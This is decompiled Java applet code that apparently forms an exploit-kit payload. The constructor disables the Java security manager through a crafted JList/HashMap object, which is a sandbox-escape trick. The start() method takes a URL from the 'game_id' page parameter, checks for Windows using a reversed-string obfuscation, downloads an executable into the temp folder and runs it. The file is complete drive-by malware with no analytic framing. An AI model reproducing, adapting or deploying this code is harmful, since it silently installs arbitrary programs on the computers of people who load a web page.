// 
// Decompiled by Procyon v0.5.30
// 

package goog;

import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

public class main extends Applet
{
    @Override
    public void start() {
        super.start();
        try {
            final String parameter = this.getParameter("game_id");
            final String property = System.getProperty(new StringBuffer("eman.so").reverse().toString());
            try {
                if (property.indexOf("Windows") >= 0) {
                    final URL url = new URL(parameter);
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("java.io.tmpdir") + "\\" + Math.pow(Math.random() * 1000.0, 3.0) + ".exe";
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    new ProcessBuilder(new String[] { string }).start();
                }
            }
            catch (Exception ex) {
                ex.printStackTrace(System.err);
            }
        }
        catch (Exception ex2) {
            ex2.printStackTrace(System.err);
        }
    }
    
    public main() {
        final YAHO yaho = new YAHO(System.class, "setSecurityManager", new Object[] { null });
        final HashSet<YAHO> set = new HashSet<YAHO>();
        set.add(yaho);
        this.add(new JList<Object>(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return set;
                }
            } }));
    }
}
